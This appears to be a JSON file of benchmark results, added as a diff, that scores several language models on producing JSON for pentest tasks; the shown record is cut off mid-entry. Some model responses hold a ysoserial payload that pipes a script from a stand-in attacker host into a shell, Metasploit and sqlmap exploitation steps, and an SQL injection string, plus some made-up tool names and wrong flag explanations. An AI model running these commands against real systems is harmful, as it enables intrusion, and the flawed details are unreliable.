@@ -1,0 +1,1601 @@
+[
+  {
+    "model": "llama-3.1-8b-instant",
+    "provider": "groq",
+    "testsPassed": 3,
+    "testsFailed": 2,
+    "avgLatency": 302,
+    "validJsonRate": 60,
+    "skipped": 1,
+    "results": [
+      {
+        "model": "llama-3.1-8b-instant",
+        "provider": "groq",
+        "testName": "exploit_nmap_command",
+        "latency": 261,
+        "response": "{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "llama-3.1-8b-instant",
+        "provider": "groq",
+        "testName": "exploit_gobuster_command",
+        "latency": 172,
+        "response": "```json\n{\n  \"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\",\n  \"description\": \"Directory enumeration\",\n  \"args\": [\"dir\", \"-u\", \"http://target.local\", \"-w\", \"/usr/share/wordlists/dirb/common.txt\", \"-o\", \"gobuster_results.txt\"]\n}\n```",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+          "description": "Directory enumeration",
+          "args": [
+            "dir",
+            "-u",
+            "http://target.local",
+            "-w",
+            "/usr/share/wordlists/dirb/common.txt",
+            "-o",
+            "gobuster_results.txt"
+          ]
+        }
+      },
+      {
+        "model": "llama-3.1-8b-instant",
+        "provider": "groq",
+        "testName": "exploit_ffuf_command",
+        "latency": 386,
+        "response": "Here's the ffuf command to fuzz GET parameters on http://target.local/search?query=FUZZ and output only valid JSON:\n\n```bash\nffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json -fc 404\n```\n\nExplanation:\n\n- `-u 'http://target.local/search?query=FUZZ'`: specifies the URL to fuzz, including the parameter to be fuzzed.\n- `-w /usr/share/wordlists/ffuf/parameters.txt`: specifies the wordlist to use for fuzzing.\n- `-o ffuf_results.json`: specifies the output file for the results.\n- `-of json`: specifies the output format as JSON.\n- `-fc 404`: specifies that only responses with a status code of 200 (not 404) should be considered valid and written to the output file. This will effectively filter out invalid JSON responses.",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unexpected identifier \"Here\""
+      },
+      {
+        "model": "llama-3.1-8b-instant",
+        "provider": "groq",
+        "testName": "mission_plan_json",
+        "latency": 136,
+        "response": "{\n  \"mission_id\": \"test-001\",\n  \"objectives\": [],\n  \"phases\": [\n    {\n      \"name\": \"\",\n      \"tools\": [],\n      \"commands\": []\n    }\n  ],\n  \"expected_duration\": \"2h\"\n}",
+        "validJson": true,
+        "parseable": {
+          "mission_id": "test-001",
+          "objectives": [],
+          "phases": [
+            {
+              "name": "",
+              "tools": [],
+              "commands": []
+            }
+          ],
+          "expected_duration": "2h"
+        }
+      },
+      {
+        "model": "llama-3.1-8b-instant",
+        "provider": "groq",
+        "testName": "finding_json",
+        "latency": 555,
+        "response": "Here's a more detailed JSON finding report:\n\n```json\n{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected on 10.0.0.5\",\n  \"description\": \"The SSH service is running on port 22, which may indicate potential unauthorized access or misconfigured security settings.\",\n  \"evidence\": {\n    \"ip_address\": \"10.0.0.5\",\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": \"unknown\"\n  },\n  \"recommendations\": [\n    {\n      \"description\": \"Verify SSH configuration and ensure that it is properly secured.\",\n      \"action\": \"Review SSH configuration and consider implementing additional security measures, such as two-factor authentication or limiting access to specific IP addresses.\"\n    },\n    {\n      \"description\": \"Consider disabling or restricting SSH access to the system.\",\n      \"action\": \"Disable or restrict SSH access to the system, or limit access to specific IP addresses or users.\"\n    }\n  ]\n}\n```\n\nThis report includes more details about the finding, such as the IP address where the SSH service was detected, and provides recommendations for remediation.",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unexpected identifier \"Here\""
+      },
+      {
+        "model": "llama-3.1-8b-instant",
+        "provider": "groq",
+        "testName": "code_review_json",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: Groq 429: {\"error\":{\"message\":\"Rate limit reached for model `llama-3.1-8b-instant` in organization `org_01kn7rck4fe6d9fpqedyfjyxgh` service tier `on_demand` on tokens per minute (TPM): Limit 6000, Used 4201, Requested 2166. Please try again in 3.67s. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing\",\"type\":\"tokens\",\"code\":\"rate_limit_exceeded\"}}\n"
+      }
+    ]
+  },
+  {
+    "model": "llama-3.3-70b-versatile",
+    "provider": "groq",
+    "testsPassed": 6,
+    "testsFailed": 0,
+    "avgLatency": 367,
+    "validJsonRate": 100,
+    "skipped": 0,
+    "results": [
+      {
+        "model": "llama-3.3-70b-versatile",
+        "provider": "groq",
+        "testName": "exploit_nmap_command",
+        "latency": 210,
+        "response": "{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "llama-3.3-70b-versatile",
+        "provider": "groq",
+        "testName": "exploit_gobuster_command",
+        "latency": 205,
+        "response": "{\"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\", \"description\": \"Directory enumeration\", \"args\": [\"dir\", \"-u\", \"-w\", \"-o\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+          "description": "Directory enumeration",
+          "args": [
+            "dir",
+            "-u",
+            "-w",
+            "-o"
+          ]
+        }
+      },
+      {
+        "model": "llama-3.3-70b-versatile",
+        "provider": "groq",
+        "testName": "exploit_ffuf_command",
+        "latency": 248,
+        "response": "{\"command\": \"ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json\", \"description\": \"Parameter fuzzing\", \"args\": [\"-u\", \"-w\", \"-o\", \"-of\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json",
+          "description": "Parameter fuzzing",
+          "args": [
+            "-u",
+            "-w",
+            "-o",
+            "-of"
+          ]
+        }
+      },
+      {
+        "model": "llama-3.3-70b-versatile",
+        "provider": "groq",
+        "testName": "mission_plan_json",
+        "latency": 677,
+        "response": "{\"mission_id\": \"test-001\", \"objectives\": [\"Identify vulnerabilities in the web application\", \"Exploit vulnerabilities to gain unauthorized access\", \"Document all findings and provide recommendations for remediation\"], \"phases\": [{\"name\": \"Reconnaissance\", \"tools\": [\"Nmap\", \"Burp Suite\"], \"commands\": [\"nmap -sV <target_ip>\", \"burpsuite --scan <target_url>\"]}, {\"name\": \"Vulnerability Scanning\", \"tools\": [\"Nessus\", \"OpenVAS\"], \"commands\": [\"nessus -s <target_ip>\", \"openvas -s <target_ip>\"]}, {\"name\": \"Exploitation\", \"tools\": [\"Metasploit\", \"ZAP\"], \"commands\": [\"msfconsole -q <target_ip>\", \"zap -scan <target_url>\"]}], \"expected_duration\": \"2h\"}",
+        "validJson": true,
+        "parseable": {
+          "mission_id": "test-001",
+          "objectives": [
+            "Identify vulnerabilities in the web application",
+            "Exploit vulnerabilities to gain unauthorized access",
+            "Document all findings and provide recommendations for remediation"
+          ],
+          "phases": [
+            {
+              "name": "Reconnaissance",
+              "tools": [
+                "Nmap",
+                "Burp Suite"
+              ],
+              "commands": [
+                "nmap -sV <target_ip>",
+                "burpsuite --scan <target_url>"
+              ]
+            },
+            {
+              "name": "Vulnerability Scanning",
+              "tools": [
+                "Nessus",
+                "OpenVAS"
+              ],
+              "commands": [
+                "nessus -s <target_ip>",
+                "openvas -s <target_ip>"
+              ]
+            },
+            {
+              "name": "Exploitation",
+              "tools": [
+                "Metasploit",
+                "ZAP"
+              ],
+              "commands": [
+                "msfconsole -q <target_ip>",
+                "zap -scan <target_url>"
+              ]
+            }
+          ],
+          "expected_duration": "2h"
+        }
+      },
+      {
+        "model": "llama-3.3-70b-versatile",
+        "provider": "groq",
+        "testName": "finding_json",
+        "latency": 650,
+        "response": "```json\n{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected\",\n  \"description\": \"An SSH service was detected on port 22, which could potentially allow unauthorized access to the system if not properly secured.\",\n  \"evidence\": {\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": \"unknown\"\n  },\n  \"recommendations\": [\n    \"Ensure that the SSH service is properly configured and secured.\",\n    \"Use strong passwords and consider implementing multi-factor authentication.\",\n    \"Limit access to the SSH service to only necessary users and groups.\",\n    \"Regularly review and update the SSH service configuration to ensure it remains secure.\"\n  ]\n}\n```",
+        "validJson": true,
+        "parseable": {
+          "finding_id": "auto-001",
+          "severity": "medium",
+          "title": "SSH Service Detected",
+          "description": "An SSH service was detected on port 22, which could potentially allow unauthorized access to the system if not properly secured.",
+          "evidence": {
+            "port": 22,
+            "service": "ssh",
+            "version": "unknown"
+          },
+          "recommendations": [
+            "Ensure that the SSH service is properly configured and secured.",
+            "Use strong passwords and consider implementing multi-factor authentication.",
+            "Limit access to the SSH service to only necessary users and groups.",
+            "Regularly review and update the SSH service configuration to ensure it remains secure."
+          ]
+        }
+      },
+      {
+        "model": "llama-3.3-70b-versatile",
+        "provider": "groq",
+        "testName": "code_review_json",
+        "latency": 211,
+        "response": "{\"vulnerability\": \"SQL Injection\", \"severity\": \"critical\", \"location\": \"line 2\", \"exploit\": \"id=1 OR 1=1\", \"fix\": \"Use prepared statements\"}",
+        "validJson": true,
+        "parseable": {
+          "vulnerability": "SQL Injection",
+          "severity": "critical",
+          "location": "line 2",
+          "exploit": "id=1 OR 1=1",
+          "fix": "Use prepared statements"
+        }
+      }
+    ]
+  },
+  {
+    "model": "qwen/qwen3-32b",
+    "provider": "groq",
+    "testsPassed": 0,
+    "testsFailed": 5,
+    "avgLatency": 1262,
+    "validJsonRate": 0,
+    "skipped": 1,
+    "results": [
+      {
+        "model": "qwen/qwen3-32b",
+        "provider": "groq",
+        "testName": "exploit_nmap_command",
+        "latency": 1082,
+        "response": "<think>\nOkay, let's see. The user wants an nmap command to scan open ports on the 192.168.1.0/24 network. They specified the output should be valid JSON with a certain structure. The example given includes the command, description, and args.\n\nFirst, I need to construct the nmap command. The target is 192.168.1.0/24. Common options for a thorough scan include -p- to scan all ports, -sV for service version detection, and -sC for default scripts. The -oA option saves output in all formats. The command in the example uses these, so I should follow that.\n\nThe description should explain what the command does. The example says \"Full port scan with service detection\". That makes sense because -p- covers all ports and -sV detects services.\n\nFor the args array, each option is a separate element. The example includes \"-sV\", \"-sC\", \"-p-\", \"-oA\". Wait, the -oA is followed by the output name. But in the args array, should the output name be included? The example shows that the command includes \"192.168.1.0_scan\" as the output name after -oA. However, in the args array, the example only lists the options, not the output name. So the args are just the flags, not the filename. That's correct because the args are the options passed to nmap, and the filename is part of the command but not an argument. So the args array should only include the options.\n\nPutting it all together: the command is \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\". The description is as given. The args are the four options. Need to make sure the JSON is correctly formatted with the right keys and that there's no markdown. Also, ensure that the JSON is valid, with commas in the right places and proper quotes. Double-checking for any typos in the command and options.\n</think>\n\n{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unrecognized token '<'"
+      },
+      {
+        "model": "qwen/qwen3-32b",
+        "provider": "groq",
+        "testName": "exploit_gobuster_command",
+        "latency": 815,
+        "response": "<think>\nOkay, let's see. The user wants me to generate a gobuster dir command for enumerating web directories on http://target.local using a common wordlist. They also specified the output should be only valid JSON with the command, description, and args.\n\nFirst, I need to recall the correct syntax for gobuster's directory scanning. The basic command is gobuster dir with the URL, wordlist, and output options. The common wordlist in Kali is usually /usr/share/wordlists/dirb/common.txt. The output file is specified with -o.\n\nWait, the user mentioned \"common wordlist,\" so I should confirm the correct path. Yes, that's the standard path for the common.txt in DirB's wordlists. The command should include the -u for URL, -w for wordlist, and -o for output file. The description should be concise, like \"Directory enumeration.\"\n\nNow, the JSON structure needs to have \"command\" as the full command string, \"description\" explaining what it does, and \"args\" listing the arguments used. The arguments are dir, -u, -w, -o. Let me check if there are any other options needed. No, the user didn't specify any additional parameters, so that's all.\n\nMake sure the JSON is valid. No trailing commas, correct quotes. Also, output only the JSON without any extra text. Let me double-check the example they provided. The example uses the same structure, so I'll follow that. Alright, putting it all together.\n</think>\n\n{\"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\", \"description\": \"Directory enumeration\", \"args\": [\"dir\", \"-u\", \"-w\", \"-o\"]}",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unrecognized token '<'"
+      },
+      {
+        "model": "qwen/qwen3-32b",
+        "provider": "groq",
+        "testName": "exploit_ffuf_command",
+        "latency": 765,
+        "response": "<think>\nOkay, let's see. The user wants me to generate an ffuf command to fuzz GET parameters on the URL http://target.local/search?query=FUZZ. They also specified that the output should be valid JSON with only the command, description, and args.\n\nFirst, I need to recall the basic structure of an ffuf command. The main options are -u for the target URL, -w for the wordlist, -o for the output file, and -of for the output format. The user mentioned using the parameters.txt wordlist from /usr/share/wordlists/ffuf/, which is standard.\n\nThe URL provided uses FUZZ as the placeholder for the parameter. In ffuf, the FUZZ keyword is used to indicate where the fuzzing should occur. So the command should include the -u option with the URL as given.\n\nNext, the wordlist path is correct. The output should be in JSON format, so -of json is needed. The output file is named ffuf_results.json. The description should be concise, like \"Parameter fuzzing\".\n\nI need to make sure that the JSON structure only includes the command, description, and args array. The args should list the command-line arguments used: -u, -w, -o, -of. No extra parameters or explanations. Also, check that the JSON syntax is correct, with proper commas and quotes. Let me double-check each part to avoid any mistakes.\n</think>\n\n{\"command\": \"ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json\", \"description\": \"Parameter fuzzing\", \"args\": [\"-u\", \"-w\", \"-o\", \"-of\"]}",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unrecognized token '<'"
+      },
+      {
+        "model": "qwen/qwen3-32b",
+        "provider": "groq",
+        "testName": "mission_plan_json",
+        "latency": 1942,
+        "response": "<think>\nOkay, I need to create a JSON mission plan for a web application penetration test. The user provided a template with some fields already filled in, like mission_id and expected_duration. My task is to fill in the objectives, phases with their names, tools, and commands.\n\nFirst, let's think about the objectives. A typical web app pen test would include identifying vulnerabilities like SQL injection, XSS, insecure APIs, misconfigurations, and checking authentication flaws. So I'll list those as objectives.\n\nNext, the phases. The standard phases are reconnaissance, scanning, exploitation, and reporting. Let me break them down:\n\n1. **Reconnaissance**: Gathering info about the target. Tools like Nmap for network scanning, DirBuster for directory brute-forcing, and Nucle for vulnerability scanning. Commands would involve using these tools with appropriate flags.\n\n2. **Vulnerability Scanning**: Using tools like OWASP ZAP or Burp Suite to scan for vulnerabilities. Commands would start the scanner and maybe run specific scripts.\n\n3. **Exploitation**: Testing identified vulnerabilities. Tools like SQLMap for SQL injection, Metasploit for exploiting, and maybe curl for sending crafted requests. Commands would target specific endpoints.\n\n4. **Reporting**: Compiling findings into a report. Tools like Dradis for documentation. Commands might involve generating reports from scan results.\n\nI need to make sure each phase has a name, relevant tools, and example commands. Also, check that the JSON structure is valid, with proper commas and brackets. Let me verify the tools and commands for each phase to ensure they're appropriate. For example, in reconnaissance, Nmap is good for network discovery, DirBuster for finding hidden directories. In exploitation, SQLMap is specific to SQLi, Metasploit for more complex exploits.\n\nWait, the user's example has phases as an array with each phase having name, tools, commands. So each phase should be an object in the phases array. Let me structure each phase accordingly. Also, ensure that the JSON syntax is correct, no trailing commas, and all strings are in quotes. Let me double-check the JSON structure once I have all the content filled in.\n</think>\n\n```json\n{\n  \"mission_id\": \"test-001\",\n  \"objectives\": [\n    \"Identify and exploit SQL injection vulnerabilities\",\n    \"Discover cross-site scripting (XSS) flaws\",\n    \"Test for insecure API endpoints\",\n    \"Assess authentication and session management weaknesses\",\n    \"Evaluate server misconfigurations\"\n  ],\n  \"phases\": [\n    {\n      \"name\": \"Reconnaissance\",\n      \"tools\": [\"nmap\", \"dirb\", \"nucle\"],\n      \"commands\": [\n        \"nmap -sS -sV target.com\",\n        \"dirb http://target.com\",\n        \"nucle -t templates/ -u http://target.com\"\n      ]\n    },\n    {\n      \"name\": \"Vulnerability Scanning\",\n      \"tools\": [\"owasp-zap\", \"burp-suite\"],\n      \"commands\": [\n        \"zap.sh -cmd -url http://target.com -scandir /scans\",\n        \"burp --scan http://target.com\"\n      ]\n    },\n    {\n      \"name\": \"Exploitation\",\n      \"tools\": [\"sqlmap\", \"metasploit\", \"curl\"],\n      \"commands\": [\n        \"sqlmap -u 'http://target.com/page?id=1' --batch\",\n        \"msfconsole -x 'use exploit/multi/http/webdav_upload; set RHOSTS target.com; run'\",\n        \"curl -X POST -d 'payload' http://target.com/vulnerable-endpoint\"\n      ]\n    },\n    {\n      \"name\": \"Reporting\",\n      \"tools\": [\"dradis\", \"markdown-reporter\"],\n      \"commands\": [\n        \"dradis generate report --template=penetration-test --output=report.html\",\n        \"markdown-reporter compile findings.md -o final_report.pdf\"\n      ]\n    }\n  ],\n  \"expected_duration\": \"2h\"\n}\n```",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unrecognized token '<'"
+      },
+      {
+        "model": "qwen/qwen3-32b",
+        "provider": "groq",
+        "testName": "finding_json",
+        "latency": 1704,
+        "response": "<think>\nOkay, let's tackle this. The user wants a JSON finding report for an open SSH port (22) on 10.0.0.5. The initial structure is provided, but I need to fill in the description and recommendations.\n\nFirst, the description should explain what SSH is and why it's a medium risk. Maybe mention that SSH is used for secure remote access but can be a target for attacks if not configured properly. Also, note that having it open might expose the system to brute force attacks or exploitation of vulnerabilities.\n\nFor recommendations, common best practices include using key-based authentication instead of passwords, disabling root login, keeping SSH software updated, and changing the default port if possible. Also, monitoring logs for unauthorized access attempts is a good idea.\n\nI should make sure the JSON structure is correct, with proper commas and brackets. The evidence should include the port, service, and version. Since the version isn't provided, I'll leave it as an empty string. The severity is medium, which makes sense because SSH is necessary but can be risky if misconfigured.\n\nWait, the user provided the initial JSON with empty description and recommendations. I need to fill those in. Let me check the example again. The title is \"SSH Service Detected\", so the description should elaborate on that. Maybe start with \"An SSH service was detected...\" and mention the potential risks. The recommendations should be a list of actionable items.\n\nAlso, ensure that the JSON syntax is correct. No trailing commas, proper quotation marks. Let me double-check each part. The finding_id is auto-001, severity is medium, title is as given. Evidence has port 22, service ssh, version empty. Recommendations should be an array of strings. Alright, that should cover it.\n</think>\n\n```json\n{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected\",\n  \"description\": \"An SSH (Secure Shell) service was detected on port 22 of the target system. While SSH is commonly used for secure remote administration, its presence may indicate potential exposure to brute-force attacks, misconfigurations, or unauthorized access if not properly secured.\",\n  \"evidence\": {\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": \"\"\n  },\n  \"recommendations\": [\n    \"Implement strong authentication methods (e.g., public key authentication) and disable password-based login.\",\n    \"Restrict SSH access to specific IP addresses or networks using firewall rules.\",\n    \"Change the default SSH port (22) to a non-standard port if feasible.\",\n    \"Regularly update the SSH server to address known vulnerabilities.\",\n    \"Monitor SSH logs for suspicious activity or failed login attempts.\"\n  ]\n}\n```",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unrecognized token '<'"
+      },
+      {
+        "model": "qwen/qwen3-32b",
+        "provider": "groq",
+        "testName": "code_review_json",
+        "latency": 0,
+        "response": "",
+        "validJson": false,
+        "error": "Error: Groq 429: {\"error\":{\"message\":\"Rate limit reached for model `qwen/qwen3-32b` in organization `org_01kn7rck4fe6d9fpqedyfjyxgh` service tier `on_demand` on tokens per minute (TPM): Limit 6000, Used 5643, Requested 801. Please try again in 4.439999999s. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing\",\"type\":\"tokens\",\"code\":\"rate_limit_exceeded\"}}\n"
+      }
+    ]
+  },
+  {
+    "model": "moonshotai/kimi-k2-instruct",
+    "provider": "groq",
+    "testsPassed": 6,
+    "testsFailed": 0,
+    "avgLatency": 810,
+    "validJsonRate": 100,
+    "skipped": 0,
+    "results": [
+      {
+        "model": "moonshotai/kimi-k2-instruct",
+        "provider": "groq",
+        "testName": "exploit_nmap_command",
+        "latency": 487,
+        "response": "{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "moonshotai/kimi-k2-instruct",
+        "provider": "groq",
+        "testName": "exploit_gobuster_command",
+        "latency": 452,
+        "response": "{\"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\", \"description\": \"Directory enumeration\", \"args\": [\"dir\", \"-u\", \"-w\", \"-o\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+          "description": "Directory enumeration",
+          "args": [
+            "dir",
+            "-u",
+            "-w",
+            "-o"
+          ]
+        }
+      },
+      {
+        "model": "moonshotai/kimi-k2-instruct",
+        "provider": "groq",
+        "testName": "exploit_ffuf_command",
+        "latency": 468,
+        "response": "{\"command\":\"ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json\",\"description\":\"Parameter fuzzing\",\"args\":[\"-u\",\"-w\",\"-o\",\"-of\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json",
+          "description": "Parameter fuzzing",
+          "args": [
+            "-u",
+            "-w",
+            "-o",
+            "-of"
+          ]
+        }
+      },
+      {
+        "model": "moonshotai/kimi-k2-instruct",
+        "provider": "groq",
+        "testName": "mission_plan_json",
+        "latency": 1649,
+        "response": "{\"mission_id\":\"test-001\",\"objectives\":[\"Identify and exploit OWASP Top 10 vulnerabilities\",\"Assess authentication and session management flaws\",\"Evaluate business-logic weaknesses\",\"Provide remediation guidance\"],\"phases\":[{\"name\":\"Reconnaissance\",\"tools\":[\"nmap\",\"gobuster\",\"whatweb\"],\"commands\":[\"nmap -sV -sC -oA recon/target <target>\",\"gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -o recon/dirs.txt\",\"whatweb -v -a 3 <target> > recon/tech.txt\"]},{\"name\":\"Discovery\",\"tools\":[\"nikto\",\"burpsuite\",\"ffuf\"],\"commands\":[\"nikto -h http://<target> -o discovery/nikto.txt\",\"ffuf -w /usr/share/wordlists/dirb/big.txt -u http://<target>/FUZZ -o discovery/endpoints.txt\"]},{\"name\":\"Exploitation\",\"tools\":[\"sqlmap\",\"burpsuite\",\"commix\"],\"commands\":[\"sqlmap -u \\\"http://<target>/search?q=test\\\" --batch --risk=1 --level=3\",\"commix -u http://<target>/feedback --batch\"]},{\"name\":\"Post-Exploitation\",\"tools\":[\"burpsuite\",\"ysoserial\",\"linpeas\"],\"commands\":[\"ysoserial -g CommonsCollections4 'curl http://<attacker>/shell.sh | sh' | base64 -w0\",\"linpeas.sh > post/enum.txt\"]}],\"expected_duration\":\"2h\"}",
+        "validJson": true,
+        "parseable": {
+          "mission_id": "test-001",
+          "objectives": [
+            "Identify and exploit OWASP Top 10 vulnerabilities",
+            "Assess authentication and session management flaws",
+            "Evaluate business-logic weaknesses",
+            "Provide remediation guidance"
+          ],
+          "phases": [
+            {
+              "name": "Reconnaissance",
+              "tools": [
+                "nmap",
+                "gobuster",
+                "whatweb"
+              ],
+              "commands": [
+                "nmap -sV -sC -oA recon/target <target>",
+                "gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -o recon/dirs.txt",
+                "whatweb -v -a 3 <target> > recon/tech.txt"
+              ]
+            },
+            {
+              "name": "Discovery",
+              "tools": [
+                "nikto",
+                "burpsuite",
+                "ffuf"
+              ],
+              "commands": [
+                "nikto -h http://<target> -o discovery/nikto.txt",
+                "ffuf -w /usr/share/wordlists/dirb/big.txt -u http://<target>/FUZZ -o discovery/endpoints.txt"
+              ]
+            },
+            {
+              "name": "Exploitation",
+              "tools": [
+                "sqlmap",
+                "burpsuite",
+                "commix"
+              ],
+              "commands": [
+                "sqlmap -u \"http://<target>/search?q=test\" --batch --risk=1 --level=3",
+                "commix -u http://<target>/feedback --batch"
+              ]
+            },
+            {
+              "name": "Post-Exploitation",
+              "tools": [
+                "burpsuite",
+                "ysoserial",
+                "linpeas"
+              ],
+              "commands": [
+                "ysoserial -g CommonsCollections4 'curl http://<attacker>/shell.sh | sh' | base64 -w0",
+                "linpeas.sh > post/enum.txt"
+              ]
+            }
+          ],
+          "expected_duration": "2h"
+        }
+      },
+      {
+        "model": "moonshotai/kimi-k2-instruct",
+        "provider": "groq",
+        "testName": "finding_json",
+        "latency": 1379,
+        "response": "```json\n{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected\",\n  \"description\": \"An SSH service was discovered listening on TCP port 22 of the target host. While SSH itself is not inherently vulnerable, its presence increases the attack surface and may allow brute-force, credential-stuffing, or protocol-downgrade attacks if left unsecured.\",\n  \"evidence\": {\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": \"\",\n    \"host\": \"10.0.0.5\",\n    \"scan_tool\": \"nmap\"\n  },\n  \"recommendations\": [\n    \"Ensure only strong, public-key authentication is allowed (disable password auth).\",\n    \"Configure SSH to use only secure ciphers and MACs (e.g., chacha20-poly1305, aes256-gcm).\",\n    \"Restrict SSH access via firewall rules or security groups to trusted source IPs.\",\n    \"Change the default port to a non-standard one to reduce noise from automated scanners.\",\n    \"Implement fail2ban or equivalent to block brute-force attempts.\",\n    \"Keep the SSH server package updated with the latest security patches.\",\n    \"Monitor SSH logs centrally for anomalous login activity.\"\n  ]\n}\n```",
+        "validJson": true,
+        "parseable": {
+          "finding_id": "auto-001",
+          "severity": "medium",
+          "title": "SSH Service Detected",
+          "description": "An SSH service was discovered listening on TCP port 22 of the target host. While SSH itself is not inherently vulnerable, its presence increases the attack surface and may allow brute-force, credential-stuffing, or protocol-downgrade attacks if left unsecured.",
+          "evidence": {
+            "port": 22,
+            "service": "ssh",
+            "version": "",
+            "host": "10.0.0.5",
+            "scan_tool": "nmap"
+          },
+          "recommendations": [
+            "Ensure only strong, public-key authentication is allowed (disable password auth).",
+            "Configure SSH to use only secure ciphers and MACs (e.g., chacha20-poly1305, aes256-gcm).",
+            "Restrict SSH access via firewall rules or security groups to trusted source IPs.",
+            "Change the default port to a non-standard one to reduce noise from automated scanners.",
+            "Implement fail2ban or equivalent to block brute-force attempts.",
+            "Keep the SSH server package updated with the latest security patches.",
+            "Monitor SSH logs centrally for anomalous login activity."
+          ]
+        }
+      },
+      {
+        "model": "moonshotai/kimi-k2-instruct",
+        "provider": "groq",
+        "testName": "code_review_json",
+        "latency": 427,
+        "response": "{\"vulnerability\": \"SQL Injection\", \"severity\": \"critical\", \"location\": \"line 2\", \"exploit\": \"id=1 OR 1=1\", \"fix\": \"Use prepared statements\"}",
+        "validJson": true,
+        "parseable": {
+          "vulnerability": "SQL Injection",
+          "severity": "critical",
+          "location": "line 2",
+          "exploit": "id=1 OR 1=1",
+          "fix": "Use prepared statements"
+        }
+      }
+    ]
+  },
+  {
+    "model": "llama-3.1-8b",
+    "provider": "cerebras",
+    "testsPassed": 3,
+    "testsFailed": 3,
+    "avgLatency": 534,
+    "validJsonRate": 50,
+    "skipped": 0,
+    "results": [
+      {
+        "model": "llama-3.1-8b",
+        "provider": "cerebras",
+        "testName": "exploit_nmap_command",
+        "latency": 426,
+        "response": "{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "llama-3.1-8b",
+        "provider": "cerebras",
+        "testName": "exploit_gobuster_command",
+        "latency": 814,
